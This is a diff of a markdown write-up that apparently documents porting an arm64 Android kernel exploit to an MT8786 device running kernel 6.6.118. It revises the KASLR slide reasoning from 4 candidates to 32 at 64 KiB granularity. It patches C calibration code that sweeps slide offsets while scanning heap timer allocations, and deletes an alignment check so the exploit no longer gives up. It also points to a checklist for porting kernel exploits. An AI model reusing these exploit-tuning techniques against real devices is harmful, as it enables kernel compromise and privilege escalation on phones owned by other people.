@@ -184,15 +184,25 @@ not change and the comparison held.**
 
 ## 4. The fix
 
-### 4.1 Key observation: there are only 4 possibilities
+### 4.1 Key observation: the candidate set is finite, but the granularity is 64 KiB
 
-ARM64 KASLR offsets are multiples of `0x80000` (512 KB), so `slide mod 2MiB` can only be:
+> ⚠️ **Revision.** This section originally claimed "only 4 candidates". That inference
+> was too strong and has been corrected upstream — see
+> [kpgc10kai/Shark#6](https://github.com/kpgc10kai/Shark/issues/6).
+
+The arm64 virtual KASLR displacement is a **random multiple of 2 MiB plus the physical
+placement modulo 2 MiB**. That remainder is not necessarily a multiple of 512 KB — it is
+only constrained by module alignment, typically **64 KiB**.
+
+So the correct granularity is **64 KiB, 32 candidates**:
 
 ```
-0x000000 / 0x080000 / 0x100000 / 0x180000
+0x00000 / 0x10000 / 0x20000 / ... / 0x1f0000
 ```
 
-**Only 4 candidates. Let the program try them itself.**
+The 4 values we originally used, `{0, 0x80000, 0x100000, 0x180000}`, happen to be
+entries **0 / 8 / 16 / 24** of that sequence — **enough for the machine we had, not enough
+for every physical placement.** The 32-candidate set is a strict superset.
 
 ### 4.2 Patch 1: add a global adjustment
 
@@ -215,41 +225,49 @@ if ((site & 0x1fffffULL) != ((TIMER_SITE_LOW21 + g_low_adj) & 0x1fffffULL))
 
 (3 sites total: timer ×2, task ×1.)
 
-### 4.4 Patch 3: sweep the 4 candidates during calibration
+### 4.4 Patch 3: sweep 32 candidates at 64 KiB granularity during calibration
 
 ```c
 {
     int c = 0;
-    static const unsigned long long cands[4] = {
-        0ULL, 0x80000ULL, 0x100000ULL, 0x180000ULL};
     int best_ci = 0;
 
-    for (int ci = 0; ci < 4; ci++) {
+    for (int ci = 0; ci < 32; ci++) {
         int cc;
 
-        g_low_adj = cands[ci];
+        g_low_adj = (unsigned long long)ci * 0x10000ULL;
         cc = scan_timer_allocs(raw, (size_t)n, me, ptrs, 512, NULL);
         if (cc > c) { c = cc; best_ci = ci; }
+        if (c >= 512) break;      /* 512 is the scan cap: cannot do better */
     }
-    g_low_adj = cands[best_ci];
+    g_low_adj = (unsigned long long)best_ci * 0x10000ULL;
     /* recollect with the final value so ptrs[] is filled correctly */
     c = scan_timer_allocs(raw, (size_t)n, me, ptrs, 512, NULL);
 }
 ```
 
+It stops early once the hit count reaches the scan cap, so in practice it runs 9 scans
+(`0x80000` is entry 9 of the sequence).
+
+Artifacts: `artifacts/shark-k66118-32cand`, `artifacts/plant_core.patched.32cand.inc`,
+`artifacts/make32.py`.
+
 The probe path gets the same treatment.
 
-### 4.5 Patch 4: relax the hard 2MiB alignment check
+### 4.5 Patch 4: delete the hard 2MiB alignment check entirely
 
 ```c
 /* before */
 if (g_slide & 0x1fffffULL)
     return 1;
 
-/* after: non-2MiB alignment is no longer fatal */
-if ((g_slide & 0x1fffffULL) && (g_slide & 0x7ffffULL))
-    return 1;
+/* after: deleted */
 ```
+
+> ⚠️ **Our first attempt only relaxed it to `&& (g_slide & 0x7ffffULL)` — that was wrong.**
+> It still demands 512 KB alignment, so it rejects a legitimate 64 KiB-aligned slide:
+> the new sweep finds the correct `low_adj` and the very next line gives up.
+> This only becomes visible once the granularity moves from 512 KB to 64 KiB.
 
 ---
 
@@ -321,11 +339,16 @@ can be matched *without knowing the slide first*.
 
 ### 7.2 When it does not hold
 
-| Condition | Slide alignment |
+| Case | What we actually observed |
 |---|---|
-| `CONFIG_RANDOMIZE_BASE` with specific `VA_BITS` / page-size combinations | may be 512 KB |
-| Our device (MT8786 + 6.6.118 android15-8 + 4K pages) | **512 KB** |
-| popsicle (Xiaomi 17 Pro Max + 6.12.69) | 2MiB |
+| Normal (2 MiB aligned) | `slide & 0x1fffff == 0`; the original code works |
+| Our device (MT8786 + 6.6.118 android15-8 + 4K pages) | `slide = 0x2b45280000`, `& 0x1fffff = 0x80000` |
+| popsicle (Xiaomi 17 Pro Max + 6.12.69) | 2 MiB aligned |
+
+> ⚠️ **`0x80000` is the value we measured on one boot, not a constant of this device.**
+> The displacement includes the physical-placement remainder, so it can change across boots
+> or firmware updates. That is exactly why the sweep covers 32 candidates instead of
+> hardcoding one value.
 
 ### 7.3 Checklist when porting any kernel exploit
 
